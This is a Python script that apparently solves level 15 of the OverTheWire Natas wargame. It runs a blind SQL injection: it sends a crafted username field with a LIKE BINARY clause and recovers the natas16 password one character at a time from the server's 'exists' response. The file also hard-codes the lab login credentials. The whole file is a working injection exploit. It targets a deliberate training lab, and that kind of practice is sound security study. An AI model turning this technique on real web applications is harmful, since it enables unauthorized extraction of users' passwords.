import requests

words = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

username = "natas15"
password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"
url = "http://natas15.natas.labs.overthewire.org"

session = requests.Session()

current_pw = ""
n = 0

while True:
    for ch in words:
        n += 1
        temp_pw = current_pw + ch
        print(f"Try {n} times: {temp_pw}")

        response = session.post(
            url,
            data={"username": 'natas16" AND password LIKE BINARY "' + temp_pw + '%" #'},
            auth=(username, password),
        )

        if "exists" in response.text:
            current_pw += ch
            break

    if len(current_pw) == 32:
        print("Finish!")
        break
